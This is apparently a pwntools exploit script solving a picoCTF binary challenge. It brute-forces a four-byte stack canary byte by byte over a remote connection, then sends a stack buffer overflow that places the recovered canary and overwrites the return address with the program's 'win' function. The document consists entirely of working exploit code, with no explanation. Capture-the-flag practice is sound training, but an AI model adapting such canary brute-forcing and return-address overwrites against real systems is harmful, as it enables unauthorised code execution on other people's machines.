from pwn import *
from struct import pack
import string
from Crypto.Util.number import bytes_to_long as btl

exe = context.binary = ELF("./vuln", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "warning"

address = "saturn.picoctf.net 55906".split()

class Exploit:
    def __init__(self, p: process):
        self.p = p
        
    def debug(self, script):
        attach(self.p, gdbscript=script)
    
    def send(self, buffer, content):
        p = self.p
        p.sendlineafter(b">", str(buffer).encode())
        p.sendlineafter(b">", content)

def brute(num, byte):
    with remote(address[0], int(address[1])) as p:
    # with process() as p:
        x = Exploit(p)
        x.send(num, byte)
        s = p.recvall(timeout=1)
        if b"Ok" in s:
            return byte[-1]
    return False
            
def bruteCanary():
    canary = ""
    for _ in range(4):
        for i, byte in enumerate(string.printable):
            payload = flat([{64: canary}, byte.encode()])
            tmp = brute(1+64+len(canary),payload)
            print(f'{i} ', end="\r")
            if tmp:
                canary += chr(tmp)
                break
    return canary
        

# p = process()
p = remote(address[0], int(address[1]))
# print(bruteCanary())
canary = b"BiRd"
x = Exploit(p)
# x.debug("break *vuln+314\nc")
payload = b""
payload += b"A"*64
payload += pack(">I", btl(canary))
payload += cyclic(16)
payload += pack("<I", exe.symbols["win"])
lenghtsend = len(payload)
x.send(lenghtsend, payload)
print(p.recvall(timeout=2))
p.interactive()
